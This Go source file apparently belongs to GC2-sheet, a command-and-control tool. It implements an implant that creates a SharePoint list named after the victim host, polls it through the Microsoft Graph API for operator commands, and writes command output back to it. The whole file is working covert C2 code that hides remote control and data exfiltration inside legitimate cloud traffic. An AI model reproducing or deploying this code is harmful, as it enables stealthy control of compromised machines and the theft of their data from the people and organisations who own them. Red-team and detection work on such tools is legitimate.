package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type MicrosoftCommandExecutor struct {
	client          *MicrosoftConnector
	microsoftSiteID string
	microsoftListID MicrosoftListId
	listStartID     int
	commands        []*Command
}

func NewMicrosoftCommandExecutor(client *MicrosoftConnector) (*MicrosoftCommandExecutor, error) {
	microsoftCommandExecutor := &MicrosoftCommandExecutor{
		client:          client,
		microsoftSiteID: configuration.GetOptionsMicrosoftSiteID(),
		listStartID:     configuration.GetRowId(),
	}

	listID, err := createMicrosoftList(microsoftCommandExecutor)
	if err != nil {
		return nil, err
	}

	microsoftCommandExecutor.microsoftListID = *listID

	return microsoftCommandExecutor, nil
}

type List struct {
	DisplayName string    `json:"displayName"`
	Columns     []Columns `json:"columns"`
}

type Columns struct {
	Name string `json:"name"`
	Text Text   `json:"text"`
}

type Text struct {
	AllowMultipleLines bool `json:"allowMultipleLines"`
}

type ListResponse struct {
	Id string `json:"id"`
}

type MicrosoftListId string

var ErrorEncodingListOutput = fmt.Errorf("failed to encode list output for POST request")
var ErrorCreatingList = fmt.Errorf("an error occurred while trying to create a new list")

func createMicrosoftList(m *MicrosoftCommandExecutor) (*MicrosoftListId, error) {
	list := List{
		DisplayName: utils.GetUniqueHostnameName(),
		Columns: []Columns{
			{
				Name: "Input",
				Text: Text{},
			}, {
				Name: "Output",
				Text: Text{
					AllowMultipleLines: true,
				},
			}, {
				Name: "Ticker",
				Text: Text{},
			}, {
				Name: "Log",
				Text: Text{},
			}},
	}

	body, err := json.Marshal(list)
	if err != nil {
		return nil, ErrorEncodingListOutput
	}

	request, err := http.NewRequest(
		http.MethodPost,
		fmt.Sprintf("https://graph.microsoft.com/v1.0/sites/%s/lists", m.microsoftSiteID),
		strings.NewReader(string(body)),
	)
	if err != nil {
		return nil, err
	}

	request.Header.Set("Content-Type", "application/json")

	resp, err := m.client.do(request)
	if err != nil {
		return nil, ErrorCreatingList
	}

	var response ListResponse
	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		return nil, err
	}

	utils.LogDebug("[+] SharePoint List successfully created")

	return (*MicrosoftListId)(&response.Id), nil
}

type Fields struct {
	Input  string `json:"Input,omitempty"`
	Output string `json:"Output,omitempty"`
	Ticker string `json:"Ticker,omitempty" default:"0"`
	Log    string `json:"Log,omitempty"`
}

type ListItem struct {
	ListItemFields Fields `json:"fields"`
}

func (m *MicrosoftCommandExecutor) pullCommandAndTicker() (string, int, error) {
	itemID := strconv.Itoa(m.getLastCommand().RowId)
	url := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/sites/%s/lists/%s/items/%s",
		m.microsoftSiteID,
		m.microsoftListID,
		itemID,
	)

	fetchListItemRequest, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	fetchListItemRequest.Header.Set("Content-Type", "application/json")
	resp, err := m.client.do(fetchListItemRequest)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	var item ListItem
	err = json.NewDecoder(resp.Body).Decode(&item)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	var ticker int
	if item.ListItemFields.Ticker == "" {
		ticker = 0
	} else {
		ticker, err = strconv.Atoi(item.ListItemFields.Ticker)
		if err != nil {
			return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
		}
	}

	return item.ListItemFields.Input, ticker, nil
}

// Push configuration.Command output to remote list
func (m *MicrosoftCommandExecutor) pushOutput(lastCommand *Command) error {
	itemID := strconv.Itoa(lastCommand.RowId)

	fields := Fields{
		Output: lastCommand.Output,
		Log:    utils.GetCurrentDate(),
	}

	var body []byte

	body, err := json.Marshal(fields)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	url := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/sites/%s/lists/%s/items/%s/fields",
		m.microsoftSiteID,
		m.microsoftListID,
		itemID,
	)
	updateListItemRequest, err := http.NewRequest("PATCH", url, strings.NewReader(string(body)))
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	updateListItemRequest.Header.Set("Content-Type", "application/json")
	_, err = m.client.do(updateListItemRequest)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	return nil
}

func (m *MicrosoftCommandExecutor) appendEmptyCommand() {
	var rowId int

	last := m.getLastCommand()
	if last == nil {
		rowId = configuration.GetRowId()
	} else {
		rowId = last.RowId + 1
	}

	m.commands = append(m.commands, NewCommand(rowId))
}

func (m *MicrosoftCommandExecutor) getLastCommand() *Command {
	if len(m.commands) == 0 {
		return nil
	}

	return m.commands[len(m.commands)-1]
}
